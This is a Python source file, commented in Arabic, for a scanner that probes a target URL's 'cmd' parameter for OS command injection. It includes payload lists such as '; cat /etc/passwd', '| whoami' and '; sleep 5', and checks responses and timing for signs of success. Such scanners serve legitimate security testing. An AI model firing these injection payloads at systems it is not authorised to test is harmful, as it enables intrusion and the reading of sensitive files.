"""
OS Command Injection Scanner
يفحص: Blind, Time-based Command Injection
"""

import time
import requests
import urllib.parse
from typing import List, Dict

class CommandInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = {
            'linux': [
                "; ls",
                "| ls",
                "` ls `",
                "$(ls)",
                "; cat /etc/passwd",
                "| whoami",
                "& ping -c 5 127.0.0.1"
            ],
            'windows': [
                "& dir",
                "| dir",
                "& type C:\\windows\\win.ini",
                "& whoami",
                "& ping -n 5 127.0.0.1"
            ],
            'blind': [
                "; sleep 5",
                "| sleep 5",
                "& timeout 5",
                "& ping -n 5 127.0.0.1"
            ]
        }
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص Command Injection: {self.target}")
        
        self._test_linux_commands()
        self._test_windows_commands()
        self._test_blind_injection()
        
        return self.vulnerabilities
    
    def _test_linux_commands(self):
        """اختبار Linux commands"""
        for payload in self.payloads['linux']:
            try:
                url = f"{self.target}?cmd={urllib.parse.quote(payload)}"
                response = requests.get(url, timeout=10)
                
                indicators = ['root:', 'bin/bash', 'etc/passwd', 'uid=', 'gid=']
                if any(ind in response.text for ind in indicators):
                    self.vulnerabilities.append({
                        'type': 'OS Command Injection (Linux)',
                        'severity': 'critical',
                        'url': url,
                        'payload': payload,
                        'evidence': response.text[:300]
                    })
                    print(f"  [!] Command Injection وُجدت! Payload: {payload}")
                    return
            except:
                pass
    
    def _test_windows_commands(self):
        """اختبار Windows commands"""
        for payload in self.payloads['windows']:
            try:
                url = f"{self.target}?cmd={urllib.parse.quote(payload)}"
                response = requests.get(url, timeout=10)
                
                indicators = ['Volume Serial Number', 'Directory of', 'Windows']
                if any(ind in response.text for ind in indicators):
                    self.vulnerabilities.append({
                        'type': 'OS Command Injection (Windows)',
                        'severity': 'critical',
                        'url': url,
                        'payload': payload,
                        'evidence': response.text[:300]
                    })
                    print(f"  [!] Command Injection وُجدت! Payload: {payload}")
                    return
            except:
                pass
    
    def _test_blind_injection(self):
        """اختبار Blind Command Injection"""
        for payload in self.payloads['blind']:
            try:
                url = f"{self.target}?cmd={urllib.parse.quote(payload)}"
                start = time.time()
                requests.get(url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    self.vulnerabilities.append({
                        'type': 'Blind Command Injection',
                        'severity': 'critical',
                        'url': url,
                        'payload': payload,
                        'time_delay': elapsed
                    })
                    print(f"  [!] Blind Command Injection وُجدت!")
                    return
            except:
                pass
